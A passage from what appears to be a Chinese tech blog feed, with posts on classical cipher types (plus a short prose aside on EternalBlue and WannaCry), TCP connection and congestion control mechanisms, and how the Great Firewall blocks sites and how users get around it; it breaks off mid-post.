<p>学过网络的朋友都知道计算机之间的通信需要网络协议，同样的我们使用密码学的一些功能时，也会遵从不同的协议，我们平时用的比较多的应该就是密钥分发（ssh的id_rsa）和身份验证（登陆或者其他…）</p>
<h3 id="密码分类"><a href="#密码分类" class="headerlink" title="密码分类"></a>密码分类</h3><p>一般来说密码学的分类都会按照古典密码和传统密码去分类，但在这里是通过其方式来分类。</p>
<ul>
<li>代换密码：代换时古典密码中用到的最基本处理技巧。代换就是将明文中的一个字母由其他字母、数字或符号替代<ul>
<li>凯撒密码</li>
<li><a href="https://baike.baidu.com/item/%E4%BB%BF%E5%B0%84%E5%AF%86%E7%A0%81" target="_blank" rel="external">仿射密码</a></li>
<li>单表代换</li>
<li>多表代换,可以使用<a href="quipqiup.com">在线工具</a></li>
<li>置换密码 ：将明文字符按照某种规律重新排列而形成明文的过程</li>
</ul>
</li>
<li>Hill密码：利用了基本矩阵原理的替换密码</li>
<li>转轮密码：一种根据代替密码的思路发展起来的早期机电密码，其密码核心部件的线路成转轮状，也称圆盘密</li>
</ul>
<hr>
<h2 id="题外话—永恒之蓝"><a href="#题外话—永恒之蓝" class="headerlink" title="题外话—永恒之蓝"></a>题外话—永恒之蓝</h2><p>永恒之蓝在前段之间非常的火，可能说勒索病毒大家会更加熟悉一点，准确来说WannaCry勒索病毒是在永恒之蓝（永恒之蓝是NSA泄漏的一个Windows SMB远程漏洞利用工具）的基础上开发的蠕虫病毒，它可以自我复制传播。该蠕虫病毒先扫描网络上存在SMB漏洞的Windows机器，然后上传勒索软件到该Windows系统，锁定用户的数据并进行勒索，是一个典型的蠕虫和勒索软件的结合体。所以那段时间我们可以看到：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-21%20%E4%B8%8B%E5%8D%884.25.39.png" alt="屏幕快照 2017-10-21 下午4.25.39.png" title="" class="">
                <p>屏幕快照 2017-10-21 下午4.25.39.png</p>
            </figure>
<p>可以说是影响非常的大,但是WannaCry病毒却拥有着一个致命的缺陷，那就是病毒的作者无法明确认定哪些受害者支付了赎金，因此很难给相应的解密密钥，所以用户支付了赎金之后，电脑中的文件也是恢复不了的。</p>
]]></content>
      
        <categories>
            
            <category> 题目套路/工具总结 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[TCP/IP(四)]]></title>
      <url>/2017/10/15/TCP-IP-%E5%9B%9B/</url>
      <content type="html"><![CDATA[<p>这次来说说TCP的三次握手还有一些控制机制，另外补充DNS之后的网络传输部分</p>
<a id="more"></a>
<h1 id="TCP-IP-四"><a href="#TCP-IP-四" class="headerlink" title="TCP/IP(四)"></a>TCP/IP(四)</h1><h2 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>解释完了网络层协议及相关的技术应用之后再说说网络层的上一层—传输层，在TCP/IP中能够实现传输层功能的，具有代表性的协议就是TCP和UDP协议。</p>
<ul>
<li>TCP是面向连接型，可靠的流协议。流就是指不间断的发送数据，可以类比成排水管中的水流。当应用程序采用TCP发送消息时，虽然可以保证发送的顺序，但还是犹如没有任何间隔的数据流发送给接收端，所以这也是为什么发送端的应用程序可以在自己发送的消息中设置一个表示长度或者间隔的字段。</li>
<li>UDP是不具有可靠的数据报协议，在细微的处理上会交给上一层的协议去完成。在UDP的情况下，虽然可以确保发送消息的大小，却不能消息是否一定会到达。因此，应用会根据自己的需要重发程序。</li>
</ul>
<p>虽然有人会认为TCP因为是可靠协议，所以会优于UDP，然而二者是分别适用于不同的情况下。UDP是主要用于那些对于高速传输和实时性很高的通信或者广播通信。比如一个打电话的例子；</p>
<ol>
<li>小夫向静香打电话，用的TCP协议—“香…静， 天..明出去玩么”</li>
</ol>
<p>这就是因为TCP的重发机制，这样就无法流畅的传输通话人的声音，导致无法正常交流</p>
<ol>
<li>同样的大雄也向静香打电话，用的是UDP协议—“香，明出去玩么”</li>
</ol>
<p>虽然缺少了其中的一部分，但是并不会影响到整体的通话。此外，在广播和多播通信中也使用的是UDP而不是TCP。</p>
<hr>
<h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><p>TCP为了实现可靠的传输，需要考虑很多的事情，比如数据的破坏，丢包，重复以及分片顺序混乱等问题，为了解决这些问题，TCP通过检验和，序列号，确认应答，重发控制，连接管理以及窗口控制等机制实现可靠性传输。</p>
<h3 id="TCP连接的建立与断开控制"><a href="#TCP连接的建立与断开控制" class="headerlink" title="TCP连接的建立与断开控制"></a>TCP连接的建立与断开控制</h3><p>还是通过一个例子来说明，在DNS相关的博客中我们曾经说过，DNS进程查询到域名对应的IP之后，会将打包好的http请求发给TCP进程。TCP进程想着，我如果直接把这个加上头部之后丢给IP进程，最后这个IP包生死不知，也不知道是因为什么原因死在了路上，最终想出了一个办法，先不发 HTTP，先要确保自己的 IP 包（没有任何用户数据）可以到达服务器，并且服务器的 IP 包也可以返回，这样做的好处是：<br>一方面，可以保证双向的路径（路由）是畅通的，没有防火墙或访问列表的阻挡；<br>另一方面，如果 IP 包可以返回，说明服务器是正常工作的。这样所有担忧就都一一化解了。</p>
<h4 id="HTTP触发TCP进程三次握手连接"><a href="#HTTP触发TCP进程三次握手连接" class="headerlink" title="HTTP触发TCP进程三次握手连接"></a>HTTP触发TCP进程三次握手连接</h4><p>小明 TCP ：老大，有空吗？想和您唠唠，听到请回答！<br>服务器 TCP ：小明，听得到，你能听到我吗？<br>小明 TCP ：听得到！<br>既然双方都可以听到对方（发送 IP 包到对方，并从对方接收 IP 包），那么就可以将小明的 HTTP，使用这个三次握手建立的 TCP 连接发送出去。但是，莫急，TCP 三次握手本身也会使用 IP 进程（程序）来完成发送，由于小明电脑与服务器不在一个网段，所以是三次不同网段的通信，这个过程就不赘述。<br>在 IP 进程的眼里看，三次握手就是三个 IP 包（暂不考虑超时重传）的交互，还没有传输浏览器的 HTTP 之前，已经花费了来回三个 IP包的代价。所以http打包是发生在建立了TCP三次连接之后的</p>
<h4 id="TCP确认应答机制"><a href="#TCP确认应答机制" class="headerlink" title="TCP确认应答机制"></a>TCP确认应答机制</h4><p>对方发一个确认，喊一嗓子：IP 包已收到，那么小明 TCP 进程就放心了，喃喃自语道：收到就好……<br>这里还有一个问题，小明 TCP 进程如何知道是哪个 IP 包被对方确认收货？<br>大家都有网购经验，卖家发货时，会在外包装上打上一个序列号，当买家确认收货时（确认产品序列号），这样卖家就知道某件产品已经安全无误地到达买家手中。<br>同样的原理可以用在 IP 网络通信中。技术来源于生活，而高于生活。为了保证可靠传输，用序列号标记一下 IP 包，标记在什么地方呢？<br>TCP 头有一个 Sequence Number，它就是序列号，就是为了实现这个目的的，比如小明的 TCP 进程要传输 1000 字节数据，初始序列号从 1 开始，那么 Sequence Number 设置为 1，然后 TCP 把这 1000 个字节打包，然后层层地封装、传输，并最终到达服务器 TCP 进程。</p>
<h4 id="TCP确认应答方法"><a href="#TCP确认应答方法" class="headerlink" title="TCP确认应答方法"></a>TCP确认应答方法</h4><p>服务器如何确认呢？<br>TCP 有一个字段是专门干这个的，确认收货号 Acknowledge Number，那么这里这个 Acknowledge Number 应该是多少呢？是 1001，为什么是 1001，难道这个和一千零一夜有关？当然不是<br>1001 是告诉对方，从初始序列号 1 开始的 1000 个字节已经成功接收，准备好接收序列号从 1001 开始的数据了，这个应该很好理解吧？<br>小明 TCP 进程接收到此确认收货，就安心等待服务器将页面发送过来了。<br>这个过程一个数据、一个确认收货，一共两个 IP 包，而未确认应答不一定意味着数据丢失，也有可能是返回的确认应答在途中丢失。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-15%20%E4%B8%8B%E5%8D%884.54.15.png" alt="屏幕快照 2017-10-15 下午4.54.15.png" title="" class="">
                <p>屏幕快照 2017-10-15 下午4.54.15.png</p>
            </figure>
<p>当然也会一些情况导致确认应答在重发之后延迟到达，于是乎就会造成目标主机会反复收到相同的数据，这个时候就需要重发超时来对这个重发的时间作一个控制。</p>
<h4 id="TCP断开连接"><a href="#TCP断开连接" class="headerlink" title="TCP断开连接"></a>TCP断开连接</h4><p>服务器将请求的信息传回小明的主机之后，也就是服务器的TCP进程发给小明电脑一个IP包，小明同样的回复一个收货确认，接下来浏览器将接收到的网页输出到屏幕上之后，之后就需要断开TCP连接了，因为TCP连接会占用资源，比如端口，内存资源等等。</p>
<p>和建立的三次握手相对的，TCP断开连接需要四次握手，如果把TCP连接看成两个水管，在小明的TCP进程来看，自己发数据用出水管而接收服务器的数据使用进水管，释放连接意味着将两个水管都关闭。<br>如果小明没有数据要发给服务器，那可以放心地关闭出水管，但不能关闭进水管，因为进水管也许还有水，或者对方还需要继续运水过来，小明贸然关闭进水管不妥，可能会造成数据丢失。<br>所以进水管还是让对方来关闭比较恰当，因为对方会真正知道到底还有没有水要运输！</p>
<ol>
<li>小明 TCP 进程：老大，我没有水要运了，准备关闭我的出水管了，收到请确认！</li>
<li>服务器 TCP 进程：小明，你的出水管里的水已经接收完毕，可以放心关闭，确认完毕！一旦小明接收到确认，出水管就完成关闭，不能再用出水管运水了。此时，假设服务器也没有水要运给小明了，所以决定关闭服务器的出水管。（小明的进水管）</li>
<li>服务器 TCP 进程：小明，我也没有水要运了，准备关闭我的出水管了，收到请确认！</li>
<li>小明 TCP 进程：老大，你的出水管里的水已经接收完毕，可以放心关闭，确认完毕！</li>
</ol>
<p>小明 TCP 进程发出去的确认，自己无从知道是否对方已经接收到，除非对方超时重传关闭出水管的消息，小明启动一个定时器等待，如果超时以内没有接收到任何重传的消息，说明对方接收到自己的确认，那就彻底关闭 TCP 连接，释放所有资源（这里也体现了Unix中的一个哲学思想–没有消息就是最好的消息）。而如果接收到对方超时重传，自己再确认，然后再等待，直到最终确认对方接收到自己的确认。</p>
<p>⚠️：附上一张完整的握手到挥手的图，这样理解起来就会比较清晰：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/TCPhand.png" alt="TCPhand.png" title="" class="">
                <p>TCPhand.png</p>
            </figure>
<hr>
<h3 id="TCP的单位和控制机制"><a href="#TCP的单位和控制机制" class="headerlink" title="TCP的单位和控制机制"></a>TCP的单位和控制机制</h3><h4 id="TCP以段为单位"><a href="#TCP以段为单位" class="headerlink" title="TCP以段为单位"></a>TCP以段为单位</h4><p>在建立TCP连接的同时，也可以确定发送数据包的单位，我们也可以称其为“最大消息长度”（MSS：Maximum Segment Size）。最理想的情况是，最大消息长度正好是IP中不会被分片处理的最大数据长度。</p>
<p>TCP在传输大朗数据时，是以MSS的大小将数据进行分割发送的。进行重发时也是以MSS为单位。</p>
<p>两端的主机在发出建立连接的请求时，会在TCP首部中写入MSS选项，告诉对方自己的接口能够适应的MSS的大小（为附加MSS选项，TCP首部将不再是20字节，而是4字节的整数倍）。然后会在两者之间选择一个较小的值来使用（在建立连接时，如果某一方的MSS选项被省略，可以选为IP包的长度不超过576字节的值（IP首部20字节，TCP首部20字节，MSS 536字节））。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-15%20%E4%B8%8B%E5%8D%885.24.19.png" alt="屏幕快照 2017-10-15 下午5.24.19.png" title="" class="">
                <p>屏幕快照 2017-10-15 下午5.24.19.png</p>
            </figure>
<h4 id="窗口控制提高速度"><a href="#窗口控制提高速度" class="headerlink" title="窗口控制提高速度"></a>窗口控制提高速度</h4><p>窗口大小就是指无需等待确认应答而可以继续发送数据的最大值。如下图中，窗口大小为4个段。</p>
<p>这个机制实现了使用大量的缓冲区（Buffer 在此处标识临时保存收发数据的场所。通常是在计算机内存中开辟的一部分空间），通过对多个段同时进行确认应答的功能。<br><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-15%20%E4%B8%8B%E5%8D%885.24.42.png" alt="屏幕快照 2017-10-15 下午5.24.42.png" title="" class="">
                <p>屏幕快照 2017-10-15 下午5.24.42.png</p>
            </figure></p>
<p>在滑动窗口以外的部分包括尚未发送的数据以及已经确认对端已收到的数据。当数据发出后若如期收到确认应答就可以不用再重发，此时数据皆可以从缓冲区清除。</p>
<p>收到确认应答，将窗口滑动到确认硬代中的需要的位置。这样可以顺序地将多个段同时发送提高通信性能。这种机制也被称为滑动窗口控制。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-15%20%E4%B8%8B%E5%8D%885.25.09.png" alt="屏幕快照 2017-10-15 下午5.25.09.png" title="" class="">
                <p>屏幕快照 2017-10-15 下午5.25.09.png</p>
            </figure>
<h4 id="窗口控制和重发控制"><a href="#窗口控制和重发控制" class="headerlink" title="窗口控制和重发控制"></a>窗口控制和重发控制</h4><ul>
<li>考虑确认应答未能返回的情况。<br>这种情况下，数据已经达到对端，是不需要进行重发的。然而，在没有使用窗口控制的时候，没有收到确认应答的数据会被重发。而使用了窗口控制，如下图，某些确认应答即便丢失也无需重发。<br><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-15%20%E4%B8%8B%E5%8D%885.25.22.png" alt="屏幕快照 2017-10-15 下午5.25.22.png"></li>
<li>某个报文段丢失的情况。<br>接收主机如果收到一个自己应该接收的序号以外的数据时，会针对当前位置收到数据返回确认应答（不过即使接收端主机收到的包序号并不连续，也不会将数据丢弃而是暂时保存至缓冲区中）。<br>当某一报文段丢失后，发送端会一直收到序号为1001的确认应答，这个确认应答好像在提醒发送端“我想接收的是从1001开始的数据”。因此，在窗口比较大，又出现报文段丢失的情况下，同一个序号的确认应答将会被重复不断地返回。而发送端主机如果连续3次收到同一个确认应答（之所以连续收到3次而不是两次的理由是因为，即使数据段的序号被替换两次也不会触发重发机制）。就会将其所对应的数据进行重发。这种机制比之前提到的超时管理更加高效，因此也被称作高速重发控制。<br><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-15%20%E4%B8%8B%E5%8D%885.25.34.png" alt="屏幕快照 2017-10-15 下午5.25.34.png"></li>
</ul>
<h4 id="流控制"><a href="#流控制" class="headerlink" title="流控制"></a>流控制</h4><p>发送端根据自己的实际情况发送数据。但是，接收端可能收到的是一个毫无关系的数据包有可能会在处理其他问题上花费一些时间。因此在为这个数据包做其他处理时会耗费一些时间，甚至在高负荷情况下无法接收任何数据。如此一来，如果接收端将本应该接收的数据丢弃的话，就又会触发重发机制，从而导致网络流量的浪费。</p>
<p>为了防止这种现象发生，TCP提供一种机制可以让发送端根据接收端的实际接收能力控制发送的数据量。这就是所谓的流控制。它的具体操作时，接收端主机向发送端主机通知自己可以接收数据的大小，于是发送端会发送不超过这个限制的数据。该大小限度就被称为窗口大小。</p>
<p>TCP首部中，专门有一个字段用来通知窗口大小。接收主机将自己的可以接收的缓冲区大小放入这个字段通知给发送端。这个值越大，说明网络的吞吐量越高。</p>
<p>不过，接收端这个缓冲区一旦面临数据溢出时，窗口大小的值也会随之被设置为一个更小的值通知给发送端，从而控制数据发送量。就是说，发送端主机会根据接收端主机的指示，对发送数据的量进行控制。这也形成了一个完整的TCP流控制（流量控制）。<br><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-15%20%E4%B8%8B%E5%8D%885.25.47.png" alt="屏幕快照 2017-10-15 下午5.25.47.png" title="" class="">
                <p>屏幕快照 2017-10-15 下午5.25.47.png</p>
            </figure></p>
<h4 id="拥塞控制"><a href="#拥塞控制" class="headerlink" title="拥塞控制"></a>拥塞控制</h4><p>网络中的链路容量和交换结点中的缓存和处理机都有着工作的极限，当网络的需求超过它们的工作极限时，就出现了拥塞。拥塞控制就是防止过多的数据注入到网络中，这样可以使网络中的路由器或链路不致过载。常用的方法就是：</p>
<ol>
<li>慢开始、拥塞控制</li>
<li>快重传、快恢复</li>
</ol>
<p>一切的基础还是慢开始，这种方法的思路是这样的：</p>
<ul>
<li><p>发送方维持一个叫做“拥塞窗口”的变量，该变量和接收端口共同决定了发送者的发送窗口；</p>
</li>
<li><p>当主机开始发送数据时，避免一下子将大量字节注入到网络，造成或者增加拥塞，选择发送一个1字节的试探报文；</p>
</li>
<li><p>当收到第一个字节的数据的确认后，就发送2个字节的报文；</p>
</li>
<li><p>若再次收到2个字节的确认，则发送4个字节，依次递增2的指数级；</p>
</li>
<li><p>最后会达到一个提前预设的“慢开始门限”，比如24，即一次发送了24个分组，此时遵循下面的条件判定：</p>
<ul>
<li>cwnd &lt; ssthresh， 继续使用慢开始算法；</li>
<li>cwnd &gt; ssthresh，停止使用慢开始算法，改用拥塞避免算法；</li>
<li>cwnd = ssthresh，既可以使用慢开始算法，也可以使用拥塞避免算法；</li>
</ul>
</li>
<li><p>所谓拥塞避免算法就是：每经过一个往返时间RTT就把发送方的拥塞窗口+1，即让拥塞窗口缓慢地增大，按照线性规律增长；</p>
</li>
<li><p>当出现网络拥塞，比如丢包时，将慢开始门限设为原先的一半，然后将cwnd设为1，执行慢开始算法（较低的起点，指数级增长）；<br><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-15%20%E4%B8%8B%E5%8D%885.05.54.png" alt="屏幕快照 2017-10-15 下午5.05.54.png"></p>
</li>
</ul>
<p>上述方法的目的是在拥塞发生时循序减少主机发送到网络中的分组数，使得发生拥塞的路由器有足够的时间把队列中积压的分组处理完毕。慢开始和拥塞控制算法常常作为一个整体使用，而快重传和快恢复则是为了减少因为拥塞导致的数据包丢失带来的重传时间，从而避免传递无用的数据到网络。快重传的机制是：</p>
<ul>
<li><p>接收方建立这样的机制，如果一个包丢失，则对后续的包继续发送针对该包的重传请求；</p>
</li>
<li><p>一旦发送方接收到三个一样的确认，就知道该包之后出现了错误，立刻重传该包；</p>
</li>
<li><p>此时发送方开始执行“快恢复”算法：</p>
<ul>
<li>慢开始门限减半；</li>
<li>cwnd设为慢开始门限减半后的数值；</li>
<li>执行拥塞避免算法（高起点，线性增长）；<br><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-15%20%E4%B8%8B%E5%8D%885.06.36.png" alt="屏幕快照 2017-10-15 下午5.06.36.png"></li>
</ul>
</li>
</ul>
<h4 id="提高网络利用率的规范"><a href="#提高网络利用率的规范" class="headerlink" title="提高网络利用率的规范"></a>提高网络利用率的规范</h4><ol>
<li>Nagle算法(转自<a href="http://blog.163.com/li_xiang1102/blog/static/607140762011111103213616/" target="_blank" rel="external">Nagle 算法</a>)</li>
</ol>
<p>TCP/IP协议中，无论发送多少数据，总是要在数据前面加上协议头，同时，对方接收到数据，也需要发送ACK表示确认。为</p>
<p>了尽可能的利用网络带宽，TCP总是希望尽可能的发送足够大的数据。（一个连接会设置MSS参数，因此，TCP/IP希望每次都能够以MSS尺寸的数据块来发送数据）。Nagle算法就是为了尽可能发送大块数据，避免网络中充斥着许多小数据块。</p>
<blockquote>
<p>Nagle算法的基本定义是任意时刻，最多只能有一个未被确认的小段。 所谓“小段”，指的是小于MSS尺寸的数据块，所谓“未被确认”，是指一个数据块发送出去后，没有收到对方发送的ACK确认该数据已收到。</p>
</blockquote>
<p>Nagle算法的规则（可参考tcp_output.c文件里tcp_nagle_check函数注释）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">如果包长度达到MSS，则允许发送；</div><div class="line">如果该包含有FIN，则允许发送；</div><div class="line">设置了TCP_NODELAY选项，则允许发送；</div><div class="line">未设置TCP_CORK选项时，若所有发出去的小数据包（包长度小于MSS）均被确认，则允许发送；</div><div class="line">上述条件都未满足，但发生了超时（一般为200ms），则立即发送。</div></pre></td></tr></table></figure>
<blockquote>
<p>Nagle算法只允许一个未被ACK的包存在于网络，它并不管包的大小，因此它事实上就是一个扩展的停-等协议，只不过它是基于包停-等的，而不是基于字节停-等的。Nagle算法完全由TCP协议的ACK机制决定，这会带来一些问题，比如如果对端ACK回复很快的话，Nagle事实上不会拼接太多的数据包，虽然避免了网络拥塞，网络总体的利用率依然很低。</p>
</blockquote>
<ol>
<li><p>延迟确认应答</p>
<p>因为TCP采用的是滑动窗口的控制机制，所以大可不必为每一个数据段都作应答。TCP文件传输中，绝大多数是每两个数据段返回一次确认应答，减少协议的开销。                            </p>
<p>​                                      <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-15%20%E4%B8%8B%E5%8D%885.15.03.png" alt="屏幕快照 2017-10-15 下午5.15.03.png">  </p>
</li>
<li><p>捎带应答</p>
</li>
</ol>
<p>根据应用层协议，发送出去的消息到达对端，对端进行处理以后，会返回一个回执。</p>
<p>例如，电子邮件协议的SMTP或POP、文件传输协议FTP中的连接控制部分等。</p>
<p>在此类通信中，<strong>TCP的确认数据和回执数据可以通过一个包发送。</strong>这种方式叫做<strong>捎带应答</strong>。通过这种机制，可以使收发的数据量减少。</p>
<p>此外，接收数据之后，如果立刻返回确认应答，就无法实现捎带应答。也就是说，如果没有启用延迟确认应答就无法实现捎带应答。延迟确认应答是能够提高网络利用率从而降低计算机处理负荷的一种较优的处理机制。</p>
<p><strong>正是因为延迟确认和捎带应答机制，让TCP断开连接的时候四次挥手有时候变成三次挥手。</strong></p>
<p>因为，如果在TCP断开连接的时候，有时候只能够抓取3个数据包。这三个数据包为客户端的FIN，服务器的FIN和ACK，客户端的ACK。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-15%20%E4%B8%8B%E5%8D%885.20.50.png" alt="屏幕快照 2017-10-15 下午5.20.50.png" title="" class="">
                <p>屏幕快照 2017-10-15 下午5.20.50.png</p>
            </figure>]]></content>
      
        <categories>
            
            <category> TCP三次握手 TCP控制手段 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> TCP/IP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[GFW&中间人攻击]]></title>
      <url>/2017/10/07/GFW-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
      <content type="html"><![CDATA[<p>网络安全一直是一个非常重要的领域，但是想要在这个领域有所作为的同学必定要有一些必备的基础知识，不然只会寸步难行。这里就来普及一些在安全领域中一些基础知识和有趣的攻击手段</p>
<a id="more"></a>
<h1 id="安全知识小杂烩"><a href="#安全知识小杂烩" class="headerlink" title="安全知识小杂烩"></a>安全知识小杂烩</h1><h2 id="the-Great-Fire-Wall"><a href="#the-Great-Fire-Wall" class="headerlink" title="the Great Fire Wall"></a>the Great Fire Wall</h2><p>大天朝的GFW广为人知，GFW主要是指天朝政府监控和过滤互联网国际出口上的内容的软硬件集合，作用想必也不用多说。首先要扫盲一下GFW的部署位置，天朝的互联网国际出口都集中在北京、上海、广州等几个少数区域，而这些位置也就是GFW的设备所在处。目前在国内基本访问不了Google或者youtube之类的站点，就算是要从github上下一个东西都需要等很久。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-07%20%E4%B8%8A%E5%8D%8812.22.30.png" alt="屏幕快照 2017-10-07 上午12.22.30.png" title="" class="">
                <p>屏幕快照 2017-10-07 上午12.22.30.png</p>
            </figure>
<h3 id="GFW清扫手段"><a href="#GFW清扫手段" class="headerlink" title="GFW清扫手段"></a>GFW清扫手段</h3><h4 id="1-DNS污染和劫持"><a href="#1-DNS污染和劫持" class="headerlink" title="1. DNS污染和劫持"></a>1. DNS污染和劫持</h4><blockquote>
<p>某些<a href="http://baike.baidu.com/view/1383414.htm" target="_blank" rel="external">网络运营商</a>为了某些目的，对<a href="http://baike.baidu.com/subview/22276/15346050.htm" target="_blank" rel="external">DNS</a>进行了某些操作，导致使用<a href="http://baike.baidu.com/subview/855/5889203.htm" target="_blank" rel="external">ISP</a>的正常上网设置无法通过域名取得正确的IP地址。</p>
<p>某些国家或地区出于某些目的为了防止某网站被访问，而且其又掌握部分国际DNS根目录服务器或镜像，也会利用此方法进行屏蔽。</p>
</blockquote>
<p>目前我们访问网站主要都是通过域名进行访问，而真正访问这个网站前需要通过DNS服务器把域名解析为IP地址。而普通的DNS服务使用UDP协议，没有任何的认证机制。DNS劫持是指返回给你一个伪造页面的IP地址，DNS污染是返回给你一个不存在的页面的IP地址。DNS污染又分为了直接污染和间接污染，这个可以之后自己查询。</p>
<p>比如你使用电信、联通、移动的宽带，默认你是不需要设置任何DNS服务器的。这些DNS服务器由他们提供。一旦检测到你访问的网页是不允许的访问的，就会返回一个不存在的网页。而很多运营商也会使用DNS劫持来投放一些广告。比如某些ISP和xx合作，篡改了域名记录将谷歌的流量导向百度，也就是说你在浏览器中输入www.google.com，浏览器却打开了xx的主页。</p>
<h4 id="解决方式："><a href="#解决方式：" class="headerlink" title="解决方式："></a>解决方式：</h4><ol>
<li>使用<a href="https://www.opendns.com/setupguide/" target="_blank" rel="external">OpenDNS</a>（208.67.222.222）或<a href="https://developers.google.com/speed/public-dns/" target="_blank" rel="external">GoogleDNS</a>（8.8.8.8）（现在不太好用，被封锁，速度慢）</li>
<li>使用一些第三方的DNS服务器</li>
<li>自己用VPS搭建DNS服务器</li>
<li>使用/etc/hosts文件，直接IP访问,本地DNS缓存</li>
</ol>
<h4 id="2-IP路由劫持"><a href="#2-IP路由劫持" class="headerlink" title="2. IP路由劫持"></a>2. IP路由劫持</h4><p>通过上面一些方式，可以绕过DNS污染，通过IP地址访问无法访问的网页。但是目前针对IP进行大范围的封锁。虽然google这种大公司有很多镜像IP地址，但是目前基本全部被封锁掉，有漏网的可能也坚持不了多久。而且很多小公司的服务是部署在一些第三方的主机上，所以封锁IP有时会误伤，封锁一个IP导致主机上本来可以使用的页面也无法访问了。</p>
<p>不过目前不可能把所有国外的IP全部封锁掉，所以我们采用机会从国内连接到国外的VPS，进行翻墙。</p>
<h4 id="解决办法："><a href="#解决办法：" class="headerlink" title="解决办法："></a>解决办法：</h4><ol>
<li>使用VPS搭建代理</li>
<li>使用IPV6 （IPV6地址巨大，采用封地址不现实，但是目前国内只有部分高校部署了IPV6）</li>
</ol>
<p>ps:只有全国前二十的高校的才开放了部分部署了IPv6的，咸鱼们还是老老实实磨练自己的技术吧</p>
<h4 id="3-封锁HTTP代理"><a href="#3-封锁HTTP代理" class="headerlink" title="3. 封锁HTTP代理"></a>3. 封锁HTTP代理</h4><p>如果不想搭建VPS的话，最好的方法就是使用HTTP代理(最后同时配置http和https代理)。客户端不再直接请求目标服务器，而是请求代理服务器，然后返回结果。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-07%20%E4%B8%8A%E5%8D%8812.23.42.png" alt="屏幕快照 2017-10-07 上午12.23.42.png" title="" class="">
                <p>屏幕快照 2017-10-07 上午12.23.42.png</p>
            </figure>
<p>对于这种http代理封锁起来是非常简单的，因为http协议是明文，请求头部信息中就会包含请求的url或IP地址，一下就被检测到了。有人就会说那我就用https好了，加密一下你总检测不大了吧，但是然并卵啊，虽然通信被加密了，但是在建立连接之前会给代理服务器发送CONNECT方法，这里会带上要访问的远端服务器地址，然后，然后就没有然后了。</p>
<h4 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h4><ol>
<li>使用VPS搭建VPN</li>
<li>自己不会搭建就用别人的吧</li>
</ol>
<h3 id="4-封锁VPN"><a href="#4-封锁VPN" class="headerlink" title="4.封锁VPN"></a>4.封锁VPN</h3><blockquote>
<p><strong>虚拟专用网</strong>（英语：<strong>Virtual Private Network</strong>，简称<strong>VPN</strong>），是一种常用于连接中、大型企业或团体与团体间的私人网络的通讯方法。虚拟私人网络的讯息透过公用的网络架构（例如：<a href="https://zh.wikipedia.org/wiki/%E4%BA%92%E8%81%94%E7%BD%91" target="_blank" rel="external">互联网</a>）来传送<a href="https://zh.wikipedia.org/wiki/%E5%85%A7%E8%81%AF%E7%B6%B2" target="_blank" rel="external">内联网</a>的网络讯息。它利用已加密的<a href="https://zh.wikipedia.org/wiki/%E9%80%9A%E9%81%93%E5%8D%94%E8%AD%B0" target="_blank" rel="external">通道协议</a>（Tunneling Protocol）来达到保密、发送端认证、消息准确性等私人消息安全效果。</p>
</blockquote>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-07%20%E4%B8%8A%E5%8D%8812.35.22.png" alt="屏幕快照 2017-10-07 上午12.35.22.png" title="" class="">
                <p>屏幕快照 2017-10-07 上午12.35.22.png</p>
            </figure>
<p>正常网络通信时，所有网络请求都是通过我们的物理网卡直接发送出去。而VPN是客户端使用相应的VPN协议先与VPN服务器进行通信，成功连接后就在操作系统内建立一个虚拟网卡，一般来说默认PC上所有网络通信都从这虚拟网卡上进出，经过VPN服务器中转之后再到达目的地（VPN相当于我们走了一个专线，一般是用作加速）。</p>
<figure class="image-box">
